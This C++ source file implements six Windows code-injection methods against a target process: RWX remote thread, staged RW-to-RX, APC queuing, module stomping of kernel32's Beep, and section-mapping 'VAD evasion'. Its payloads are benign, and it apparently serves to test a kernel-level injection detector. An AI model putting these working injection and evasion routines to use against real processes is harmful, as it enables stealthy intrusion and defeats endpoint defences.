#include "Injector.hpp"

#include <format>
#include <iostream>
#include <vector>

#include "Wrappers.hpp"

namespace
{
#pragma runtime_checks("", off)
#pragma optimize("", off)
    static void __stdcall StompShellcode(PutsPayloadData* pData)
    {
        if (pData && pData->fnPuts)
        {
            pData->fnPuts(pData->message);
        }
    }
#pragma optimize("", on)
#pragma runtime_checks("", restore)

    bool InjectClassicRwx(const SafeHandle& hProc, std::string& outMessage)
    {
        LPVOID remoteMem = VirtualAllocEx(hProc, NULL, BENIGN_SHELLCODE.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteMem)
        {
            outMessage = format_win32_error("classic_rwx: virtual_alloc_ex", GetLastError());
            return false;
        }
        RemoteMemory remoteMemWrapper(hProc.get(), remoteMem, BENIGN_SHELLCODE.size());

        if (!WriteProcessMemory(hProc, remoteMem, BENIGN_SHELLCODE.data(), BENIGN_SHELLCODE.size(), NULL))
        {
            outMessage = format_win32_error("classic_rwx: write_process_memory", GetLastError());
            return false;
        }

        SafeHandle hThread(CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) remoteMem, NULL, 0, NULL));
        if (!hThread.isValid())
        {
            outMessage = format_win32_error("classic_rwx: create_remote_thread", GetLastError());
            return false;
        }

        WaitForSingleObject(hThread, 2000);
        outMessage = "classic_rwx: injection successful. check kernel logs.";
        return true;
    }

    bool InjectStagedRwRx(const SafeHandle& hProc, std::string& outMessage)
    {
        LPVOID remoteMem = VirtualAllocEx(hProc, NULL, BENIGN_SHELLCODE.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem)
        {
            outMessage = format_win32_error("staged_rw_rx: virtual_alloc_ex", GetLastError());
            return false;
        }
        RemoteMemory remoteMemWrapper(hProc.get(), remoteMem, BENIGN_SHELLCODE.size());

        if (!WriteProcessMemory(hProc, remoteMem, BENIGN_SHELLCODE.data(), BENIGN_SHELLCODE.size(), NULL))
        {
            outMessage = format_win32_error("staged_rw_rx: write_process_memory", GetLastError());
            return false;
        }

        outMessage = "staged_rw_rx: payload written as rw. waiting 5s for vad baseline, then changing protection...";
        std::cout << "\n[injector] " << outMessage << std::flush;
        Sleep(5000);

        DWORD oldProtect;
        if (!VirtualProtectEx(hProc, remoteMem, BENIGN_SHELLCODE.size(), PAGE_EXECUTE_READ, &oldProtect))
        {
            outMessage = format_win32_error("staged_rw_rx: virtual_protect_ex", GetLastError());
            return false;
        }

        SafeHandle hThread(CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) remoteMem, NULL, 0, NULL));
        if (!hThread.isValid())
        {
            outMessage = format_win32_error("staged_rw_rx: create_remote_thread", GetLastError());
            return false;
        }

        WaitForSingleObject(hThread, 2000);
        outMessage = "staged_rw_rx: injection successful. check kernel logs.";
        return true;
    }

    bool InjectQueueUserApc(const SafeHandle& hProc, DWORD pid, std::string& outMessage)
    {
        DWORD threadId = FindFirstThread(pid);
        if (!threadId)
        {
            outMessage = "queue_user_apc: could not find a thread in the target process.";
            return false;
        }

        SafeHandle hThread(OpenThread(THREAD_SET_CONTEXT, FALSE, threadId));
        if (!hThread.isValid())
        {
            outMessage = format_win32_error("queue_user_apc: open_thread", GetLastError());
            return false;
        }

        LPVOID remoteMem = VirtualAllocEx(hProc, NULL, BENIGN_SHELLCODE.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteMem)
        {
            outMessage = format_win32_error("queue_user_apc: virtual_alloc_ex", GetLastError());
            return false;
        }

        if (!WriteProcessMemory(hProc, remoteMem, BENIGN_SHELLCODE.data(), BENIGN_SHELLCODE.size(), NULL))
        {
            outMessage = format_win32_error("queue_user_apc: write_process_memory", GetLastError());
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            return false;
        }

        if (QueueUserAPC((PAPCFUNC) remoteMem, hThread, 0) == 0)
        {
            outMessage = format_win32_error("queue_user_apc: queue_user_apc", GetLastError());
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            return false;
        }

        outMessage = "queue_user_apc: successful. payload is queued.";
        return true;
    }

    bool InjectModuleStomp(const SafeHandle& hProc, std::string& outMessage)
    {
        const wchar_t* crtName = L"ucrtbased.dll";
        MODULEENTRY32W remoteCrtInfo = {0};
        if (!GetRemoteModuleInfo(hProc, crtName, remoteCrtInfo))
        {
            crtName = L"ucrtbase.dll";
            if (!GetRemoteModuleInfo(hProc, crtName, remoteCrtInfo))
            {
                outMessage = "module_stomp: could not find a recognized c runtime (ucrtbase.dll or ucrtbased.dll).";
                return false;
            }
        }

        uintptr_t remoteCrtBase = (uintptr_t) remoteCrtInfo.modBaseAddr;
        HMODULE hLocalCrt = GetModuleHandleW(crtName);
        uintptr_t localCrtBase = (uintptr_t) hLocalCrt;
        FARPROC pLocalPuts = GetProcAddress(hLocalCrt, "puts");
        if (!pLocalPuts)
        {
            outMessage = "module_stomp: could not get local address of 'puts'.";
            return false;
        }
        uintptr_t putsRva = (uintptr_t) pLocalPuts - localCrtBase;
        PutsPayloadData::pPuts remotePuts = (PutsPayloadData::pPuts)(remoteCrtBase + putsRva);

        PutsPayloadData payloadData = {};
        payloadData.fnPuts = remotePuts;
        strcpy_s(payloadData.message, "rx-int: module_stomp: success!");

        RemoteMemory pRemoteData(hProc.get(), VirtualAllocEx(hProc, NULL, sizeof(PutsPayloadData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE), sizeof(PutsPayloadData));
        RemoteMemory pRemoteShellcode(hProc.get(), VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE), 0x1000);

        if (!pRemoteData.isValid() || !pRemoteShellcode.isValid())
        {
            outMessage = format_win32_error("module_stomp: virtual_alloc_ex for payload", GetLastError());
            return false;
        }

        if (!WriteProcessMemory(hProc, pRemoteData.get(), &payloadData, sizeof(payloadData), NULL)
            || !WriteProcessMemory(hProc, pRemoteShellcode.get(), (LPCVOID) StompShellcode, 0x1000, NULL))
        {
            outMessage = format_win32_error("module_stomp: write_process_memory for payload", GetLastError());
            return false;
        }

        FARPROC pBeep = GetProcAddress(GetModuleHandle("kernel32.dll"), "Beep");
        uintptr_t beepRva = (uintptr_t) pBeep - (uintptr_t) GetModuleHandle("kernel32.dll");

        MODULEENTRY32W remoteKernel32Info = {0};
        if (!GetRemoteModuleInfo(hProc, L"kernel32.dll", remoteKernel32Info))
        {
            outMessage = "module_stomp: could not find kernel32.dll in target process.";
            return false;
        }
        PVOID remoteStompAddress = (PBYTE) remoteKernel32Info.modBaseAddr + beepRva;

        std::array<BYTE, 26> trampoline = {0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8,
                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xC3};
        *(ULONGLONG*) &trampoline[2] = (ULONGLONG) pRemoteData.get();
        *(ULONGLONG*) &trampoline[12] = (ULONGLONG) pRemoteShellcode.get();

        DWORD oldProtect;
        std::array<BYTE, trampoline.size()> originalBytes;

        if (!ReadProcessMemory(hProc, remoteStompAddress, originalBytes.data(), originalBytes.size(), NULL))
        {
            outMessage = format_win32_error("module_stomp: failed to backup original bytes", GetLastError());
        }

        if (!VirtualProtectEx(hProc, remoteStompAddress, trampoline.size(), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            outMessage = format_win32_error("module_stomp: virtual_protect_ex to enable stomp", GetLastError());
            return false;
        }

        if (!WriteProcessMemory(hProc, remoteStompAddress, trampoline.data(), trampoline.size(), NULL))
        {
            outMessage = format_win32_error("module_stomp: write_process_memory to stomp function", GetLastError());
            VirtualProtectEx(hProc, remoteStompAddress, trampoline.size(), oldProtect, &oldProtect);
            return false;
        }

        SafeHandle hThread(CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) remoteStompAddress, NULL, 0, NULL));
        bool success = hThread.isValid();
        if (success)
        {
            outMessage = "module_stomp: successful. check target console for message.";
            WaitForSingleObject(hThread, 2000);
        }
        else
        {
            outMessage = format_win32_error("module_stomp: create_remote_thread failed", GetLastError());
        }

        if (originalBytes.size() > 0)
        {
            WriteProcessMemory(hProc, remoteStompAddress, originalBytes.data(), originalBytes.size(), NULL);
            VirtualProtectEx(hProc, remoteStompAddress, trampoline.size(), oldProtect, &oldProtect);
        }

        return success;
    }

    bool InjectVadEvasion(const SafeHandle& hProc, bool usePutsPayload, std::string& outMessage)
    {
        HMODULE hNtdll = GetModuleHandle("ntdll.dll");
        auto pfnNtCreateSection = (f_NtCreateSection) GetProcAddress(hNtdll, "NtCreateSection");
        auto pfnNtMapViewOfSection = (f_NtMapViewOfSection) GetProcAddress(hNtdll, "NtMapViewOfSection");
        auto pfnNtUnmapViewOfSection = (f_NtUnmapViewOfSection) GetProcAddress(hNtdll, "NtUnmapViewOfSection");

        if (!pfnNtCreateSection || !pfnNtMapViewOfSection || !pfnNtUnmapViewOfSection)
        {
            outMessage = "vad_evasion: could not get address of required native api functions.";
            return false;
        }

        std::vector<BYTE> payload;
        RemoteMemory pRemoteData(nullptr, nullptr, 0);

        if (usePutsPayload)
        {
            const wchar_t* crtName = L"ucrtbased.dll";
            MODULEENTRY32W remoteCrtInfo = {0};
            if (!GetRemoteModuleInfo(hProc, crtName, remoteCrtInfo))
            {
                crtName = L"ucrtbase.dll";
                if (!GetRemoteModuleInfo(hProc, crtName, remoteCrtInfo))
                {
                    outMessage = "vad_evasion (puts): could not find a recognized c runtime.";
                    return false;
                }
            }
            uintptr_t remoteCrtBase = (uintptr_t) remoteCrtInfo.modBaseAddr;
            HMODULE hLocalCrt = GetModuleHandleW(crtName);
            uintptr_t localCrtBase = (uintptr_t) hLocalCrt;
            FARPROC pLocalPuts = GetProcAddress(hLocalCrt, "puts");
            if (!pLocalPuts)
            {
                outMessage = "vad_evasion (puts): could not get local address of 'puts'.";
                return false;
            }
            uintptr_t putsRva = (uintptr_t) pLocalPuts - localCrtBase;
            PutsPayloadData::pPuts remotePuts = (PutsPayloadData::pPuts)(remoteCrtBase + putsRva);

            PutsPayloadData payloadData = {};
            payloadData.fnPuts = remotePuts;
            strcpy_s(payloadData.message, "rx-int: vad_evasion (puts): success!");

            pRemoteData = RemoteMemory(hProc.get(), VirtualAllocEx(hProc, NULL, sizeof(PutsPayloadData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE), sizeof(PutsPayloadData));
            RemoteMemory pRemoteShellcode(hProc.get(), VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE), 0x1000);

            if (!pRemoteData.isValid() || !pRemoteShellcode.isValid())
            {
                outMessage = format_win32_error("vad_evasion (puts): virtual_alloc_ex for payload", GetLastError());
                return false;
            }

            if (!WriteProcessMemory(hProc, pRemoteData.get(), &payloadData, sizeof(payloadData), NULL)
                || !WriteProcessMemory(hProc, pRemoteShellcode.get(), (LPCVOID) StompShellcode, 0x1000, NULL))
            {
                outMessage = format_win32_error("vad_evasion (puts): write_process_memory for payload", GetLastError());
                return false;
            }

            payload.resize(26);
            payload = {0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xC3};
            *(ULONGLONG*) &payload[2] = (ULONGLONG) pRemoteData.get();
            *(ULONGLONG*) &payload[12] = (ULONGLONG) pRemoteShellcode.get();
        }
        else
        {
            payload.assign(BENIGN_SHELLCODE.begin(), BENIGN_SHELLCODE.end());
        }

        HANDLE hSectionRaw = NULL;
        LARGE_INTEGER sectionSize;
        sectionSize.QuadPart = payload.size();
        NTSTATUS status =
            pfnNtCreateSection(&hSectionRaw, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        SafeHandle hSection(hSectionRaw);

        if (!NT_SUCCESS(status) || !hSection.isValid())
        {
            outMessage = std::format("vad_evasion: nt_create_section failed. ntstatus: {:#x}", (ULONG) status);
            return false;
        }

        PVOID pRwView = nullptr;
        SIZE_T viewSize = 0;
        status = pfnNtMapViewOfSection(hSection, hProc, &pRwView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);

        if (!NT_SUCCESS(status) || !pRwView)
        {
            outMessage = std::format("vad_evasion: nt_map_view_of_section (rw) failed. ntstatus: {:#x}", (ULONG) status);
            return false;
        }

        if (!WriteProcessMemory(hProc, pRwView, payload.data(), payload.size(), NULL))
        {
            outMessage = format_win32_error("vad_evasion: write_process_memory to rw view", GetLastError());
            pfnNtUnmapViewOfSection(hProc, pRwView);
            return false;
        }

        PVOID pRxView = nullptr;
        viewSize = 0;
        status = pfnNtMapViewOfSection(hSection, hProc, &pRxView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);

        if (!NT_SUCCESS(status) || !pRxView)
        {
            outMessage = std::format("vad_evasion: nt_map_view_of_section (rx) failed. ntstatus: {:#x}", (ULONG) status);
            pfnNtUnmapViewOfSection(hProc, pRwView);
            return false;
        }

        SafeHandle hThread(CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRxView, NULL, 0, NULL));
        if (hThread.isValid())
        {
            outMessage = std::format("vad_evasion: successful. rx view at {:#x}, rw view at {:#x}", (uintptr_t) pRxView, (uintptr_t) pRwView);
            WaitForSingleObject(hThread, 2000);
        }
        else
        {
            outMessage = format_win32_error("vad_evasion: create_remote_thread failed", GetLastError());
        }

        pfnNtUnmapViewOfSection(hProc, pRxView);
        pfnNtUnmapViewOfSection(hProc, pRwView);

        return hThread.isValid();
    }

} // namespace

bool Injector::Inject(unsigned long pid, InjectionMethod method, std::string& outMessage)
{
    SafeHandle hProc(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid));
    if (!hProc.isValid())
    {
        outMessage = format_win32_error(std::format("open_process for pid {}", pid), GetLastError());
        return false;
    }

    switch (method)
    {
    case InjectionMethod::ClassicRwx:
        return InjectClassicRwx(hProc, outMessage);
    case InjectionMethod::StagedRwRx:
        return InjectStagedRwRx(hProc, outMessage);
    case InjectionMethod::QueueUserApc:
        return InjectQueueUserApc(hProc, pid, outMessage);
    case InjectionMethod::ModuleStomp:
        return InjectModuleStomp(hProc, outMessage);
    case InjectionMethod::VadEvasion:
        return InjectVadEvasion(hProc, false, outMessage);
    case InjectionMethod::VadEvasionPuts:
        return InjectVadEvasion(hProc, true, outMessage);
    default:
        outMessage = "unknown injection method.";
        return false;
    }
}